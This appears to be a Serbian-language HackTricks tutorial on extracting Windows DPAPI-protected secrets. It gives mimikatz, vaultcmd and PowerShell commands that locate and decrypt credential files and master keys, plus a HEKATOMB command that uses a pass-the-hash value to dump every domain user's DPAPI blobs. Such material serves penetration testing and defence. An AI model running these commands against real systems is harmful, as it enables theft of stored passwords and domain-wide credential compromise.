# DPAPI - Izvlačenje lozinki

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za sajber bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repozitorijumu**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijumu**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji događaj u oblasti sajber bezbednosti u **Španiji** i jedan od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je ključno mesto susreta tehnoloških i sajber bezbednosnih profesionalaca u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Šta je DPAPI

API za zaštitu podataka (DPAPI) se primarno koristi u Windows operativnom sistemu za **simetričnu enkripciju asimetričnih privatnih ključeva**, koristeći korisničke ili sistemske tajne kao značajan izvor entropije. Ovaj pristup pojednostavljuje enkripciju za developere omogućavajući im da enkriptuju podatke koristeći ključ izveden iz korisničkih prijavljivačkih tajni ili, za sistemsku enkripciju, tajne za autentifikaciju domena sistema, čime se eliminiše potreba za developerima da sami upravljaju zaštitom enkripcijskog ključa.

### Zaštićeni podaci pomoću DPAPI

Među ličnim podacima zaštićenim DPAPI-jem su:

* Lozinke i podaci za automatsko popunjavanje Internet Explorer-a i Google Chrome-a
* Lozinke za e-poštu i interne FTP naloge za aplikacije poput Outlook-a i Windows Mail-a
* Lozinke za deljene fascikle, resurse, bežične mreže i Windows Vault, uključujući ključeve za enkripciju
* Lozinke za udaljene desktop konekcije, .NET Passport i privatni ključevi za različite svrhe enkripcije i autentifikacije
* Mrežne lozinke upravljane od strane Credential Manager-a i lični podaci u aplikacijama koje koriste CryptProtectData, poput Skype-a, MSN messengera i drugih

## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Fajlovi sa kredencijalima

**Zaštićeni fajlovi sa kredencijalima** mogu se nalaziti u:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Koristeći mimikatz `dpapi::cred`, u odgovoru možete pronaći zanimljive informacije poput šifrovanih podataka i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Možete koristiti **mimikatz modul** `dpapi::cred` sa odgovarajućim `/masterkey` da dešifrujete:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Glavni ključevi

DPAPI ključevi koji se koriste za šifrovanje korisničkih RSA ključeva čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde je {SID} [**Identifikator bezbednosti**](https://en.wikipedia.org/wiki/Security_Identifier) **tog korisnika**. **DPAPI ključ se čuva u istoj datoteci kao i glavni ključ koji štiti korisničke privatne ključeve**. Obično je to 64 bajta slučajnih podataka. (Primetite da je ovaj direktorijum zaštićen, tako da ga ne možete listati koristeći `dir` iz cmd-a, ali ga možete listati iz PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ovako će izgledati gomila Master ključeva korisnika:

![](<../../.gitbook/assets/image (1118).png>)

Obično **svaki master ključ je šifrovan simetrični ključ koji može dešifrovati drugi sadržaj**. Stoga je **izvlačenje** **šifrovanog Master ključa** zanimljivo kako bi se kasnije **dešifrovao** taj **drugi sadržaj** koji je šifrovan tim ključem.

### Izvlačenje master ključa i dešifrovanje

Proverite post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) za primer kako izvući master ključ i dešifrovati ga.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) je C# port nekih funkcionalnosti DPAPI-a iz [@gentilkiwi](https://twitter.com/gentilkiwi)'s projekta [Mimikatz](https://github.com/gentilkiwi/mimikatz/).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje izvlačenje svih korisnika i računara iz LDAP direktorijuma i izvlačenje rezervnog ključa kontrolera domena putem RPC-a. Skripta će zatim rešiti sve IP adrese računara i izvršiti smbclient na svim računarima kako bi dobila sve DPAPI blokove svih korisnika i dešifrovala sve sa rezervnim ključem domena.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Sa izvučenom listom računara iz LDAP-a možete pronaći svaku podmrežu čak i ako ih niste znali!

"Zato što prava administratora domena nisu dovoljna. Hakujte ih sve."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski izbaciti tajne zaštićene DPAPI-jem.

## Reference

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji događaj u oblasti **kibernetičke bezbednosti** u **Španiji** i jedan od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je ključno mesto susreta tehnoloških i bezbednosnih stručnjaka u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kibernetičkoj bezbednosti**? Želite li videti svoju **kompaniju reklamiranu na HackTricks**? ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
